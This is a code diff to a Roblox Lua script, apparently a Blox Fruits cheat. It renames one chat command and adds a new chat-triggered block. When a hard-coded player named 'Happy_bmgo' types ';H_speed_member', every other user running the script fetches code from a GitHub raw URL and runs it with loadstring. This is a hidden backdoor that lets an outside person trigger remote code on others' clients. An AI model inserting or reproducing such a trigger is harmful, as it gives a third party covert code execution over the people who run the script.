@@ -133,7 +133,7 @@ end
 
 local function onPlayerChatted(player)
     player.Chatted:Connect(function(message)
-        if player.Name == targetPlayerName and message == ";H_catch_member" then
+        if player.Name == targetPlayerName and message == ";H_catch" then
             local humanoidRootPart = player.Character:WaitForChild("HumanoidRootPart")
 
             
@@ -182,4 +182,24 @@ for _, player in pairs(game.Players:GetPlayers()) do
     if player.Name == targetPlayerName then
         onPlayerChatted(player)
     end
+end
+--sp
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        
+        if player.Name == "Happy_bmgo" and message:lower() == ";H_speed_member" then
+            -- Chạy script bạn muốn
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/HAPPY-script/SPEED_BLOX_FRUIT/refs/heads/main/SPEED_BLOX_FRUIT"))()
+        end
+    end)
+end)
+
+
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        if player.Name == "Happy_bmgo" and message:lower() == ";H_speed_member" then
+            -- Chạy script bạn muốn
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/HAPPY-script/SPEED_BLOX_FRUIT/refs/heads/main/SPEED_BLOX_FRUIT"))()
+        end
+    end)
 end
